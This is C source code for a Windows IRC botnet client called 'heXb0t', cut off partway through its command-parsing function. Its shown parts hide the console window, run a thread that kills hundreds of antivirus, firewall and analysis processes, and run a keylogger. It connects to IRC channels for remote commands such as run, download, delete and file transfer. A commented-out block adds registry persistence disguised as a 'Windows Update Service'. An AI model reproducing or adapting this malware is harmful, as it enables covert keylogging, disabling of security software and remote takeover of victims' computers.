#include <windows.h> 
#include <stdio.h>   
#include <winsock.h> 
#include <string.h>  
#include <tlhelp32.h>
#include <wininet.h>
#include <small.h>

const char shost[]    =  "irc.undernet.org";
const char bhost[]    =  "irc.bolchat.org";	
	
const int  sPort       =   6667;		
const int  bPort       =   6666;		

const char HomeChan [] =  "#myb0tchan";	
const char BacChan  [] =  "#secondchan";
	 
const char ChanPass [] =  "pass";			 	
const char bPrefix  [] = "[h3x]";		
const char Botpwd   [] = "pass";
const char bver     [] = "heXb0t by Nibble";

//bot commands
//These commands u can send on pvt to b0t or on the HomeChan/BackChan.

const char Prefix      [] = ".";	    //1
const char login_cmd   [] = "login";    //2
const char op_cmd      [] = "op";       //3
const char deop_cmd    [] = "deop";     //4
const char v_cmd       [] = "v";        //5
const char vn_cmd      [] = "-v";	    //6
const char kick_cmd    [] = "kick";     //7
const char ban_cmd     [] = "ban";      //8
const char unban_cmd   [] = "unban";    //9
const char join_cmd    [] = "join";     //10
const char logout_cmd  [] = "logout";   //11
const char part_cmd    [] = "part";     //12
const char hop_cmd     [] = "hop";      //13
const char reco_cmd    [] = "reconnect";//14
const char rndn_cmd    [] = "rndnick";  //15
const char die_cmd     [] = "die";      //16
const char raw_cmd     [] = "raw";      //17
const char status_cmd  [] = "status";   //18
const char dns_cmd     [] = "dns";      //19
const char listf_cmd   [] = "listf";    //20
const char dccget_cmd  [] = "get";      //21
const char process_cmd [] = "listp";    //22
const char killp_cmd   [] = "killp";    //23
const char listd_cmd   [] = "listd";    //24
const char run_cmd	   [] = "run";	    //25
const char md_cmd      [] = "makedir";  //26
const char rd_cmd      [] = "removedir";   //27
const char del_cmd     [] = "del";	    //28
const char ren_cmd     [] = "ren";	    //29
const char thr_cmd     [] = "threads";  //30
const char killthr_cmd [] = "killthr";  //31
const char keylogg_cmd [] = "keyspy";   //32
const char keystop_cmd [] = "keystop";  //33
const char delay_cmd   [] = "delay";    //34
const char download_cmd[] = "download"; //35
const char msg_cmd	   [] = "msg";		//36
const char notice_cmd  [] = "notice";	//37

const short flood        = 2600;

const char ok_cmd     [] = "\2Operation Complete";
const char no_cmd     [] = "\2Operation Error";

const char kdir       [] = "C:\\";
const char kfilename  [] = "Log.txt";

const char botmtx	  [] = "h3xb0t";
//-------------------------------
//Requests of this commands bot will send on HomeChan/BacChan
const char ver_cmd    [] = "version";
const char sys_cmd    [] = "sysinfo";

#define maxlogins  5

SOCKET create_sock(char *host, int port);
SOCKET keysock;

DWORD WINAPI dcc_getfile(LPVOID param);
DWORD WINAPI dcc_send(LPVOID param);
DWORD WINAPI irc_connect(LPVOID param);
DWORD WINAPI ListF(LPVOID param);
DWORD WINAPI ListP(LPVOID param);
DWORD WINAPI kill_av(LPVOID param);
DWORD WINAPI keylogger(LPVOID Param);
DWORD WINAPI Download(LPVOID Param);

void irc_send(SOCKET,char*);
void privmsg(SOCKET,char*,char*);
void Connect(char*,int);
void KillProcess(char Process[250],BOOL AV);
void ListD(SOCKET sock);
void Run(SOCKET,char*,char*,char*);
void ClearUsers(char*);


int  Split(SOCKET,char*,char*);
int  Check(char*);
int  addthread(char*,SOCKET,HANDLE,int,char*);
int  dccsenderror(SOCKET sock,char *chan,char *buf);
int  sendkeys(SOCKET sock,char *buf,char *window,char *logfile);
int  CheckMaster(char*);
int  CheckNet();
int  Write(HANDLE,char*);

char *DNS(char*);
char *cNick(char*);
char *cHost(char *);
char *rndnick(char*);								
char *Command(char*);
char *sysinfo(char *sinfo);

 unsigned __int64 cpuspeed(void);
 unsigned __int64 cyclecount();

 char logins[maxlogins][50]={0};

 typedef struct ircs {
	char          host[64];			 
	char	     rnick[16];			 
	char          chan[64];			
	char		  hchan[64];
	char	    chpass[16];			
	int				port;			 
	int			   thdnum ;		
	SOCKET		  sock;

}   ircs;

 ircs mirc;

 typedef struct lpt {

	 SOCKET sock;
	 char dir[64];
	 char who[32];

 }	 lpt;

DWORD started,total, days, hours, minutes;

SOCKET dcchosts;

char who[64];
char dcchost[20];
char dccfilename[MAX_PATH];
char sendtochan[50];
int dccport;

SOCKET lsock;
char   pwho[64];
char curchan[32];



char logfile[MAX_PATH];
int sendkeysto;
char keylogchan[50];

 typedef struct threads_struct {
	char name [250];
	int id; 
	int num;
	int port;
	SOCKET sock;
	HANDLE Threat_Handle;
	char dir[MAX_PATH];
	char file[MAX_PATH];
} thread;

 typedef struct Down_struct {
	 SOCKET sock;
	 char   web [64];
	 char   Path[64];
	 char   Run [12];
 } Down;

 Down Downs;

 thread threads[40];

int killer_delay = 1000;

char *kill_list[]={
		"ACKWIN32.EXE", "ADAWARE.EXE", "ADVXDWIN.EXE", "AGENTSVR.EXE", "AGENTW.EXE", "ALERTSVC.EXE", "ALEVIR.EXE", "ALOGSERV.EXE", 
		"AMON9X.EXE", "ANTI-TROJAN.EXE", "ANTIVIRUS.EXE", "ANTS.EXE", "APIMONITOR.EXE", "APLICA32.EXE", "APVXDWIN.EXE",
		"ARR.EXE", "ATCON.EXE", "ATGUARD.EXE", "ATRO55EN.EXE", "ATUPDATER.EXE", "ATUPDATER.EXE", "ATWATCH.EXE", "AU.EXE",
		"AUPDATE.EXE", "AUPDATE.EXE", "AUTODOWN.EXE", "AUTODOWN.EXE", "AUTOTRACE.EXE", "AUTOTRACE.EXE", "AUTOUPDATE.EXE",
		"AUTOUPDATE.EXE", "AVCONSOL.EXE", "AVE32.EXE", "AVGCC32.EXE", "AVGCTRL.EXE", "AVGNT.EXE", "AVGSERV.EXE",
		"AVGSERV9.EXE", "AVGUARD.EXE", "AVGW.EXE", "AVKPOP.EXE", "AVKSERV.EXE", "AVKSERVICE.EXE", "AVKWCTl9.EXE",
		"AVLTMAIN.EXE", "AVNT.EXE", "AVP.EXE", "AVP32.EXE", "AVPCC.EXE", "AVPDOS32.EXE", "AVPM.EXE", "AVPTC32.EXE",
		"AVPUPD.EXE", "AVPUPD.EXE", "AVSCHED32.EXE", "AVSYNMGR.EXE", "AVWIN95.EXE", "AVWINNT.EXE", "AVWUPD.EXE",
		"AVWUPD32.EXE", "AVWUPD32.EXE", "AVWUPSRV.EXE", "AVXMONITOR9X.EXE", "AVXMONITORNT.EXE", "AVXQUAR.EXE",
		"AVXQUAR.EXE", "BACKWEB.EXE", "BARGAINS.EXE", "BD_PROFESSIONAL.EXE", "BEAGLE.EXE", "BELT.EXE", "BIDEF.EXE",
		"BIDSERVER.EXE", "BIPCP.EXE", "BIPCPEVALSETUP.EXE", "BISP.EXE", "BLACKD.EXE", "BLACKICE.EXE", "BLSS.EXE",
		"BOOTCONF.EXE", "BOOTWARN.EXE", "BORG2.EXE", "BPC.EXE", "BRASIL.EXE", "BS120.EXE", "BUNDLE.EXE", "BVT.EXE",
		"CCAPP.EXE", "CCEVTMGR.EXE", "CCPXYSVC.EXE", "CDP.EXE", "CFD.EXE", "CFGWIZ.EXE", "CFIADMIN.EXE", "CFIAUDIT.EXE",
		"CFIAUDIT.EXE", "CFINET.EXE", "CFINET32.EXE", "CLAW95CF.EXE", "CLEAN.EXE", "CLEANER.EXE", "CLEANER3.EXE",
		"CLEANPC.EXE", "CLICK.EXE", "CMD32.EXE", "CMESYS.EXE", "CMGRDIAN.EXE", "CMON016.EXE", "CONNECTIONMONITOR.EXE",
		"CPD.EXE", "CPF9X206.EXE", "CPFNT206.EXE", "CTRL.EXE", "CV.EXE", "CWNB181.EXE", "CWNTDWMO.EXE", "Claw95.EXE",
		"CLAW95CF.EXE", "DATEMANAGER.EXE", "DCOMX.EXE", "DEFALERT.EXE", "DEFSCANGUI.EXE", "DEFWATCH.EXE", "DEPUTY.EXE",
		"DIVX.EXE", "DLLCACHE.EXE", "DLLREG.EXE", "DOORS.EXE", "DPF.EXE", "DPFSETUP.EXE", "DPPS2.EXE", "DRWATSON.EXE",
		"DRWEB32.EXE", "DRWEBUPW.EXE", "DSSAGENT.EXE", "DVP95.EXE", "DVP95_0.EXE", "ECENGINE.EXE", "EFPEADM.EXE",
		"EMSW.EXE", "ENT.EXE", "ESAFE.EXE", "ESCANH95.EXE", "ESCANHNT.EXE", "ESCANV95.EXE", "ESPWATCH.EXE", "ETHEREAL.EXE",
		"ETRUSTCIPE.EXE", "EVPN.EXE", "EXANTIVIRUS-CNET.EXE", "EXE.AVXW.EXE", "EXPERT.EXE", "EXPLORE.EXE",
		"F-AGNT95.EXE", "F-PROT.EXE", "F-PROT95.EXE", "F-STOPW.EXE", "FAMEH32.EXE", "FAST.EXE", "FCH32.EXE", "FIH32.EXE",
		"FINDVIRU.EXE", "FIREWALL.EXE", "FLOWPROTECTOR.EXE", "FNRB32.EXE", "FP-WIN.EXE", "FP-WIN_TRIAL.EXE",
		"FPROT.EXE", "FRW.EXE", "FSAA.EXE", "FSAV.EXE", "FSAV32.EXE", "FSAV530STBYB.EXE", "FSAV530WTBYB.EXE", "FSAV95.EXE",
		"FSGK32.EXE", "FSM32.EXE", "FSMA32.EXE", "FSMB32.EXE", "GATOR.EXE", "GBMENU.EXE", "GBPOLL.EXE", "GENERICS.EXE",
		"GMT.EXE", "GUARD.EXE", "GUARDDOG.EXE", "HACKTRACERSETUP.EXE", "HBINST.EXE", "HBSRV.EXE", "HOTACTIO.EXE",
		"HOTPATCH.EXE", "HTLOG.EXE", "HTPATCH.EXE", "HWPE.EXE", "HXDL.EXE", "HXIUL.EXE", "IAMAPP.EXE", "IAMSERV.EXE",
		"IAMSTATS.EXE", "IBMASN.EXE", "IBMAVSP.EXE", "ICLOAD95.EXE", "ICLOADNT.EXE", "ICMON.EXE", "ICSUPP95.EXE",
		"ICSUPP95.EXE", "ICSUPPNT.EXE", "IDLE.EXE", "IEDLL.EXE", "IEDRIVER.EXE", "IEXPLORER.EXE", "IFACE.EXE",
		"IFW2000.EXE", "INETLNFO.EXE", "INFUS.EXE", "INFWIN.EXE", "INIT.EXE", "INTDEL.EXE", "INTREN.EXE", "IOMON98.EXE",
		"IPARMOR.EXE", "IRIS.EXE", "ISASS.EXE", "ISRV95.EXE", "ISTSVC.EXE", "JAMMER.EXE", "JDBGMRG.EXE", "JEDI.EXE",
		"KAVLITE40ENG.EXE", "KAVPERS40ENG.EXE", "KAVPF.EXE", "KAZZA.EXE", "KEENVALUE.EXE", "KERIO-PF-213-EN-WIN.EXE",
		"KERIO-WRL-421-EN-WIN.EXE", "KERIO-WRP-421-EN-WIN.EXE", "KERNEL32.EXE", "KILLPROCESSSETUP161.EXE",
		"LAUNCHER.EXE", "LDNETMON.EXE", "LDPRO.EXE", "LDPROMENU.EXE", "LDSCAN.EXE", "LNETINFO.EXE", "LOADER.EXE",
		"LOCALNET.EXE", "LOCKDOWN.EXE", "LOCKDOWN2000.EXE", "LOOKOUT.EXE", "LORDPE.EXE", "LSETUP.EXE", "LUALL.EXE",
		"LUALL.EXE", "LUAU.EXE", "LUCOMSERVER.EXE", "LUINIT.EXE", "LUSPT.EXE", "MAPISVC32.EXE", "MCAGENT.EXE", "MCMNHDLR.EXE",
		"MCSHIELD.EXE", "MCTOOL.EXE", "MCUPDATE.EXE", "MCUPDATE.EXE", "MCVSRTE.EXE", "MCVSSHLD.EXE", "MD.EXE", "MFIN32.EXE",
		"MFW2EN.EXE", "MFWENG3.02D30.EXE", "MGAVRTCL.EXE", "MGAVRTE.EXE", "MGHTML.EXE", "MGUI.EXE", "MINILOG.EXE",
		"MMOD.EXE", "MONITOR.EXE", "MOOLIVE.EXE", "MOSTAT.EXE", "MPFAGENT.EXE", "MPFSERVICE.EXE", "MPFTRAY.EXE",
		"MRFLUX.EXE", "MSAPP.EXE", "MSBB.EXE", "MSBLAST.EXE", "MSCACHE.EXE", "MSCCN32.EXE", "MSCMAN.EXE", "MSCONFIG.EXE",
		"MSDM.EXE", "MSDOS.EXE", "MSIEXEC16.EXE", "MSINFO32.EXE", "MSLAUGH.EXE", "MSMGT.EXE", "MSMSGRI32.EXE",
		"MSSMMC32.EXE", "MSSYS.EXE", "MSVXD.EXE", "MU0311AD.EXE", "MWATCH.EXE", "N32SCANW.EXE", "NAV.EXE",
		"AUTO-PROTECT.NAV80TRY.EXE", "NAVAP.NAVAPSVC.EXE", "NAVAPSVC.EXE", "NAVAPW32.EXE", "NAVDX.EXE",
		"NAVENGNAVEX15.NAVLU32.EXE", "NAVLU32.EXE", "NAVNT.EXE", "NAVSTUB.EXE", "NAVW32.EXE", "NAVWNT.EXE",
		"NC2000.EXE", "NCINST4.EXE", "NDD32.EXE", "NEOMONITOR.EXE", "NEOWATCHLOG.EXE", "NETARMOR.EXE", "NETD32.EXE",
		"NETINFO.EXE", "NETMON.EXE", "NETSCANPRO.EXE", "NETSPYHUNTER-1.2.EXE", "NETSTAT.EXE", "NETUTILS.EXE",
		"NISSERV.EXE", "NISUM.EXE", "NMAIN.EXE", "NOD32.EXE", "NORMIST.EXE", "NORTON_INTERNET_SECU_3.0_407.EXE",
		"NOTSTART.EXE", "NPF40_TW_98_NT_ME_2K.EXE", "NPFMESSENGER.EXE", "NPROTECT.EXE", "NPSCHECK.EXE",
		"NPSSVC.EXE", "NSCHED32.EXE", "NSSYS32.EXE", "NSTASK32.EXE", "NSUPDATE.EXE", "NT.EXE", "NTRTSCAN.EXE", "NTVDM.EXE",
		"NTXconfig.EXE", "NUI.EXE", "NUPGRADE.EXE", "NUPGRADE.EXE", "NVARCH16.EXE", "NVC95.EXE", "NVSVC32.EXE",
		"NWINST4.EXE", "NWSERVICE.EXE", "NWTOOL16.EXE", "OLLYDBG.EXE", "ONSRVR.EXE", "OPTIMIZE.EXE", "OSTRONET.EXE",
		"OTFIX.EXE", "OUTPOST.EXE", "OUTPOST.EXE", "OUTPOSTINSTALL.EXE", "OUTPOSTPROINSTALL.EXE", "PADMIN.EXE",
		"PANIXK.EXE", "PATCH.EXE", "PAVCL.EXE", "PAVPROXY.EXE", "PAVSCHED.EXE", "PAVW.EXE", "PCC2002S902.EXE",
		"PCC2K_76_1436.EXE", "PCCIOMON.EXE", "PCCNTMON.EXE", "PCCWIN97.EXE", "PCCWIN98.EXE", "PCDSETUP.EXE",
		"PCFWALLICON.EXE", "PCIP10117_0.EXE", "PCSCAN.EXE", "PDSETUP.EXE", "PENIS.EXE", "PERISCOPE.EXE", "PERSFW.EXE",
		"PERSWF.EXE", "PF2.EXE", "PFWADMIN.EXE", "PGMONITR.EXE", "PINGSCAN.EXE", "PLATIN.EXE", "POP3TRAP.EXE", "POPROXY.EXE",
		"POPSCAN.EXE", "PORTDETECTIVE.EXE", "PORTMONITOR.EXE", "POWERSCAN.EXE", "PPINUPDT.EXE", "PPTBC.EXE",
		"PPVSTOP.EXE", "PRIZESURFER.EXE", "PRMT.EXE", "PRMVR.EXE", "PROCDUMP.EXE", "PROCESSMONITOR.EXE",
		"PROCEXPLORERV1.0.EXE", "PROGRAMAUDITOR.EXE", "PROPORT.EXE", "PROTECTX.EXE", "PSPF.EXE", "PURGE.EXE",
		"PUSSY.EXE", "PVIEW95.EXE", "QCONSOLE.EXE", "QSERVER.EXE", "RAPAPP.EXE", "RAV7.EXE", "RAV7WIN.EXE",
		"RAV8WIN32ENG.EXE", "RAY.EXE", "RB32.EXE", "RCSYNC.EXE", "REALMON.EXE", "REGED.EXE", "REGEDIT.EXE", "REGEDT32.EXE",
		"RESCUE.EXE", "RESCUE32.EXE", "RRGUARD.EXE", "RSHELL.EXE", "RTVSCAN.EXE", "RTVSCN95.EXE", "RULAUNCH.EXE",
		"RUN32DLL.EXE", "RUNDLL.EXE", "RUNDLL16.EXE", "RUXDLL32.EXE", "SAFEWEB.EXE", "SAHAGENT.EXE", "SAVE.EXE",
		"SAVENOW.EXE", "SBSERV.EXE", "SC.EXE", "SCAM32.EXE", "SCAN32.EXE", "SCAN95.EXE", "SCANPM.EXE", "SCRSCAN.EXE",
		"SCRSVR.EXE", "SCVHOST.EXE", "SD.EXE", "SERV95.EXE", "SERVICE.EXE", "SERVLCE.EXE", "SERVLCES.EXE",
		"SETUPVAMEEVAL.EXE", "SETUP_FLOWPROTECTOR_US.EXE", "SFC.EXE", "SGSSFW32.EXE", "SH.EXE",
		"SHELLSPYINSTALL.EXE", "SHN.EXE", "SHOWBEHIND.EXE", "SMC.EXE", "SMS.EXE", "SMSS32.EXE", "SOAP.EXE", "SOFI.EXE",
		"SPERM.EXE", "SPF.EXE", "SPHINX.EXE", "SPOLER.EXE", "SPOOLCV.EXE", "SPOOLSV32.EXE", "SPYXX.EXE", "SREXE.EXE",
		"SRNG.EXE", "SS3EDIT.EXE", "SSGRATE.EXE", "SSG_4104.EXE", "ST2.EXE", "START.EXE", "STCLOADER.EXE", "SUPFTRL.EXE",
		"SUPPORT.EXE", "SUPPORTER5.EXE", "SVC.EXE", "SVCHOSTC.EXE", "SVCHOSTS.EXE", "SVSHOST.EXE", "SWEEP95.EXE",
		"SWEEPNET.SWEEPSRV.SYS.SWNETSUP.EXE", "SYMPROXYSVC.EXE", "SYMTRAY.EXE", "SYSEDIT.EXE", "SYSTEM.EXE",
		"SYSTEM32.EXE", "SYSUPD.EXE", "TASKMG.EXE", "TASKMO.EXE", "TASKMON.EXE", "TAUMON.EXE", "TBSCAN.EXE", "TC.EXE",
		"TCA.EXE", "TCM.EXE", "TDS-3.EXE", "TDS2-98.EXE", "TDS2-NT.EXE", "TEEKIDS.EXE", "TFAK.EXE", "TFAK5.EXE", "TGBOB.EXE",
		"TITANIN.EXE", "TITANINXP.EXE", "TRACERT.EXE", "TRICKLER.EXE", "TRJSCAN.EXE", "TRJSETUP.EXE", "TROJANTRAP3.EXE",
		"TSADBOT.EXE", "TVMD.EXE", "TVTMD.EXE", "UNDOBOOT.EXE", "UPDAT.EXE", "UPDATE.EXE", "UPDATE.EXE", "UPGRAD.EXE",
		"UTPOST.EXE", "VBCMSERV.EXE", "VBCONS.EXE", "VBUST.EXE", "VBWIN9X.EXE", "VBWINNTW.EXE", "VCSETUP.EXE", "VET32.EXE",
		"VET95.EXE", "VETTRAY.EXE", "VFSETUP.EXE", "VIR-HELP.EXE", "VIRUSMDPERSONALFIREWALL.EXE", "VNLAN300.EXE",
		"VNPC3000.EXE", "VPC32.EXE", "VPC42.EXE", "VPFW30S.EXE", "VPTRAY.EXE", "VSCAN40.EXE", "VSCENU6.02D30.EXE",
		"VSCHED.EXE", "VSECOMR.EXE", "VSHWIN32.EXE", "VSISETUP.EXE", "VSMAIN.EXE", "VSMON.EXE", "VSSTAT.EXE",
		"VSWIN9XE.EXE", "VSWINNTSE.EXE", "VSWINPERSE.EXE", "W32DSM89.EXE", "W9X.EXE", "WATCHDOG.EXE", "WEBDAV.EXE",
		"WEBSCANX.EXE", "WEBTRAP.EXE", "WFINDV32.EXE", "WGFE95.EXE", "WHOSWATCHINGME.EXE", "WIMMUN32.EXE",
		"WIN-BUGSFIX.EXE", "WIN32.EXE", "WIN32US.EXE", "WINACTIVE.EXE", "WINDOW.EXE", "WINDOWS.EXE", "WININETD.EXE",
		"WININIT.EXE", "WININITX.EXE", "WINLOGIN.EXE", "WINMAIN.EXE", "WINNET.EXE", "WINPPR32.EXE", "WINRECON.EXE",
		"WINSERVN.EXE", "WINSSK32.EXE", "WINSTART.EXE", "WINSTART001.EXE", "WINTSK32.EXE", "WINUPDATE.EXE",
		"WKUFIND.EXE", "WNAD.EXE", "WNT.EXE", "WRADMIN.EXE", "WRCTRL.EXE", "WSBGATE.EXE", "WUPDATER.EXE", "WUPDT.EXE",
		"WYVERNWORKSFIREWALL.EXE", "XPF202EN.EXE", "ZAPRO.EXE", "ZAPSETUP3001.EXE", "ZATUTOR.EXE", "ZONALM2601.EXE",
		"ZONEALARM.EXE", "_AVP32.EXE", "_AVPCC.EXE", "_AVPM.EXE", "HIJACKTHIS.EXE", "F-AGOBOT.EXE", 
		"ANTI","VIRU","TROJA","AVP","NAV","RAV","REGED","NOD32","SPYBOT","ZONEA","VSMON","AVG","BLACKICE","FIREWALL","MSCONFIG",
		"LOCKDOWN","F-PRO","MCAFEE","PROCESS","AWARE","REGISTRY","TASKMGR.EXE",'\0'
};

int inputL[]={
	8,
	13,
	27,
	112,
	113,
	114,
	115,
	116,
	117,
	118,
	119,
	120,
	121,
	122,
	123,
	192,
	49,
	50,
	51,
	52,
	53,
	54,
	55,
	56,
	57,
	48,
	189,
	187,
	9,
	81,
	87,
	69,
	82,
	84,
	89,
	85,
	73,
	79,
	80,
	219,
	221,
	65,
	83,
	68,
	70,
	71,
	72,
	74,
	75,
	76,
	186,
	222,
	90,
	88,
	67,
	86,
	66,
	78,
	77,
	188,
	190,
	191,
	220,
	17,
	91,
	32,
	92,
	44,
	145,
	45,
	36,
	33,
	46,
	35,
	34,
	37,
	38,
	39,
	40,
	144,
	111,
	106,
	109,
	107,
	96,
	97,
	98,
	99,
	100,
	101,
	102,
	103,
	104,
	105,
	110,
};

char *outputL[]={
	"b",
	"e",
	"[ESC]",
	"[F1]",
	"[F2]",
	"[F3]",
	"[F4]",
	"[F5]",
	"[F6]",
	"[F7]",
	"[F8]",
	"[F9]",
	"[F10]",
	"[F11]",
	"[F12]",
	"`",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	"0",
	"-",
	"=",
	"[TAB]",
	"q",
	"w",
	"e",
	"r",
	"t",
	"y",
	"u",
	"i",
	"o",
	"p",
	"[",
	"]",
	"a",
	"s",
	"d",
	"f",
	"g",
	"h",
	"j",
	"k",
	"l",
	";",
	"'",
	"z",
	"x",
	"c",
	"v",
	"b",
	"n",
	"m",
	",",
	".",
	"/",
	"\\",
	"[CTRL]",
	"[WIN]",
	" ",
	"[WIN]",
	"[Print Screen]",
	"[Scroll Lock]",
	"[Insert]",
	"[Home]",
	"[Pg Up]",
	"[Del]",
	"[End]",
	"[Pg Dn]",
	"[Left]",
	"[Up]",
	"[Right]",
	"[Down]",
	"[Num Lock]",
	"/",
	"*",
	"-",
	"+",
	"0",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	".",
}; 

char *outputH[]={
	"b",
	"e",
	"[ESC]",
	"[F1]",
	"[F2]",
	"[F3]",
	"[F4]",
	"[F5]",
	"[F6]",
	"[F7]",
	"[F8]",
	"[F9]",
	"[F10]",
	"[F11]",
	"[F12]",
	"~",
	"!",
	"@",
	"#",
	"$",
	"%",
	"^",
	"&",
	"*",
	"(",
	")",
	"_",
	"+",
	"[TAB]",
	"Q",
	"W",
	"E",
	"R",
	"T",
	"Y",
	"U",
	"I",
	"O",
	"P",
	"{",
	"}",
	"A",
	"S",
	"D",
	"F",
	"G",
	"H",
	"J",
	"K",
	"L",
	":",
	"\"",
	"Z",
	"X",
	"C",
	"V",
	"B",
	"N",
	"M",
	"<",
	">",
	".?",
	"|",
	"[CTRL]",
	"[WIN]",
	" ",
	"[WIN]",
	"[Print Screen]",
	"[Scroll Lock]",
	"[Insert]",
	"[Home]",
	"[Pg Up]",
	"[Del]",
	"[End]",
	"[Pg Dn]",
	"[Left]",
	"[Up]",
	"[Right]",
	"[Down]",
	"[Num Lock]",
	"/",
	"*",
	"-",
	"+",
	"0",
	"1",
	"2",
	"3",
	"4",
	"5",
	"6",
	"7",
	"8",
	"9",
	".",
};

int main()					
{												
	WSADATA wsadata;
	HANDLE Threat_Handle;

	DWORD   id;
	DWORD	err;
	
	HMODULE hMe;
	HKEY    hKey;

	DWORD   nRet;
	HWND   stealth;

	char cfilename[MAX_PATH];
	char windir[MAX_PATH];

	int c;
	
	for (c=0;c < 40;c++)
		threads[c].id = 0;

	stealth = FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);

	Threat_Handle = CreateThread(NULL, 0, &kill_av, NULL, 0, &id);

	addthread("KillAV",0,Threat_Handle,1,"\0");
	
	Threat_Handle = CreateThread(NULL, 0, &keylogger, NULL, 0, &id);
	
	addthread("Keylogger",0,Threat_Handle,1,"\0");

	started = GetTickCount() / 1000;

	strcpy(mirc.host,shost); 
	strcpy(mirc.rnick,rndnick(mirc.rnick)); 
	strcpy(mirc.chan ,HomeChan); 
	strcpy(mirc.chpass,ChanPass); 
	strcpy(mirc.hchan,BacChan);
	mirc.port = sPort;

	err = WSAStartup(MAKEWORD(2, 2), &wsadata);

	if (err != 0) return 0;

	if ( LOBYTE( wsadata.wVersion ) != 2 || HIBYTE( wsadata.wVersion ) != 2 ) {
		WSACleanup();
		return 0;
	}

/*

	hMe = GetModuleHandle(NULL);
	nRet= GetModuleFileName(hMe, cfilename, 256);
	
	GetWindowsDirectory(windir,sizeof(windir));

	CreateMutex(NULL, FALSE, botmtx);

	while (GetLastError() == ERROR_ALREADY_EXISTS) {
		Sleep(6000);	
	}

	if(!strstr(cfilename,windir))
	{

	strcat(windir,"\\services.exe");

	CopyFile(cfilename,windir,TRUE);

	RegCreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey);
	RegSetValueEx(hKey,"Windows Update Service",0,REG_SZ,windir,sizeof(windir));
	RegCloseKey(hKey);
	ShellExecute(0, "open",windir, NULL, NULL, SW_HIDE);
    ExitProcess(0);
	}

	Sleep(30000);*/


	irc_connect((void *)&mirc);

	WSACleanup();

	return 0;
}

void ClearUsers(char *User)
{
	int i;
	
	if(strlen(User) == 0)
	{
		for(i = 0;i < maxlogins;i++)
				memset(logins[i],0,50);
	}
	else
	{
		for(i = 0;i < maxlogins;i++)
			if(strcmp(logins[i],User) == 0)
				memset(logins[i],0,50);
	}

}

int CheckMaster(char *User)
{
	int i;

	for(i = 0;i < maxlogins;i++)
		if(strcmp(logins[i],User) == 0)
			return 1;

		return 0;
	}
	
char *DNS(char *what)
{
WORD sockVersion;
WSADATA wsaData;
HOSTENT *hostent = NULL;
IN_ADDR iaddr;
static char buffer[512];
DWORD addr = inet_addr(what);

 memset(buffer,0,512);

 sockVersion = MAKEWORD( 1, 0 );

if( WSAStartup( sockVersion, &wsaData ) != 0)return 0;

 if (addr != INADDR_NONE) 
 {
  hostent = gethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);			
  if (hostent != NULL) {
	  strcpy(buffer,hostent->h_name);
  return buffer;
  }
 }
 else 
 {
	hostent = gethostbyname(what);

	if (hostent != NULL) {
	    	iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
	 	    strcpy(buffer,inet_ntoa(iaddr));
		   return buffer;
		}
	}
 if (hostent == NULL){

		strcpy(buffer,"cant resolve adress");
			return buffer;
	}
	strcpy(buffer,"Some error");
	return buffer;
}
	
 DWORD WINAPI irc_connect(LPVOID param)
 {
	SOCKET sock;
	SOCKADDR_IN ssin;

	DWORD err;
	DWORD er;

	int len;
	int t;
	int x;

	char buf[512];
	char buffer[512];

	ircs irc;
	ircs *ircp = (ircs *)param;
	irc = *((ircs *)param);

Again:;

		memset(&ssin, 0, sizeof(ssin));
		sock = socket(AF_INET, SOCK_STREAM, 0);
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons((short)irc.port);
		ssin.sin_addr.s_addr  = inet_addr(DNS(irc.host));
		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
			
		if (err == SOCKET_ERROR) {
			closesocket(sock);
			Sleep(2000);

			goto Again;
		}
		memset(buffer,0,512);
		sprintf(buffer,"NICK %s\nUSER %s \"[h3x]\" \"%s\" :%s\n",irc.rnick,"[h3x]",irc.host,"Private b0t");
		irc_send(sock,buffer);

		x = 0;

	while (1) {

		memset(buffer,0,sizeof(buffer));

		if((len = recv(sock, buffer,sizeof(buffer), 0))== SOCKET_ERROR)
			goto Again;

		for (t=0;t!=len;t++)
		{
			if (buffer[t] == '\r' || buffer[t] == '\n' ) {
			
				if (x == 0) continue;
			
				buf[x] = '\0';
			
				er = Split(sock,buf,irc.rnick);

				memset(buf,0,sizeof(buf));

				x=0;
			}
			else {
				buf[x] = buffer[t];
				x++;
			}
		}
	}
 }


char *rndnick(char *strbuf)
 {
	int n, nl,prf;
	char nick[33];

	srand(GetTickCount());
	memset(nick, 0, sizeof(nick));
	
	prf = strlen(bPrefix);

	nl = (rand()%4)+3;
	for (n=0; n<nl; n++) nick[n] = (rand()%26)+97;
	nick[n+1] = '\0';

	strcpy(strbuf,bPrefix);

	strncat(strbuf, nick,12 - prf);

	return strbuf;
 }

 void irc_send(SOCKET sock, char *msg)
 {
	char msgbuf[512];
	
	if(!strlen(msg))return;
	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, "%s\r\n", msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

void privmsg(SOCKET sock,char *msg,char *chan) 
{
	char buffer[512] = {0};

	if (sock < 1) return; 
	if (chan) 
		sprintf(buffer,"PRIVMSG %s :%s\n",chan,msg);
	else 
		sprintf(buffer,"%s\n",msg);
	irc_send(sock,buffer);

}


int Split(SOCKET sock,char *line,char *mynick)
{
	char *arg[32];
	char nick[16];
	char buffer[512] = {0};
	char buff[512] = {0};
	char command[32];
	int i,t,sec;

	DWORD id;
	HANDLE Threat_Handle;
	lpt lst;

	arg[0] = strtok(line, " ");

	for (i = 1; i < 32; i++) arg[i] = strtok(NULL, " ");

	if (strcmp(arg[0],"PING") == 0)
//	{
//		arg[0][1] = 'O';
//		sprintf(buffer,"%s %s",arg[0],arg[1]);

		sprintf(buffer, "PONG %s", arg[1]);
//	}

	if (strcmp("376", arg[1]) == 0 || strcmp("422", arg[1]) == 0){
		sprintf(buffer, "JOIN %s %s",HomeChan,ChanPass);
		strcpy(curchan,HomeChan);
	}

	if (strcmp("432", arg[1]) == 0 || strcmp("433", arg[1]) == 0){
		strcpy(buffer, "NICK ");
	  	 strcat(buffer,rndnick(nick));
		  irc_send(sock,buffer);
		    strcpy(mynick,buffer);

		memset(buffer,0,512);
